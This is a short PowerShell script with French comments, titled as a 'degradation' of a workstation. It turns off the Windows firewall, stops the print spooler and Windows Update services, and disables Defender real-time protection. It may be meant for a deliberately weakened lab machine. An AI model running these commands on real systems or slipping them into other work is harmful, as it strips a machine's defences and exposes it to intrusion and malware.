Write-Host "=== Dégradation du poste ==="

# Désactivation Pare-feu
netsh advfirewall set allprofiles state off

# Arrêt du Spooler
Stop-Service spooler -Force

# Désactivation Windows Update
Stop-Service wuauserv -Force

# Désactivation Defender temps réel
Set-MpPreference -DisableRealtimeMonitoring $true

Write-Host "Dégradation terminée"
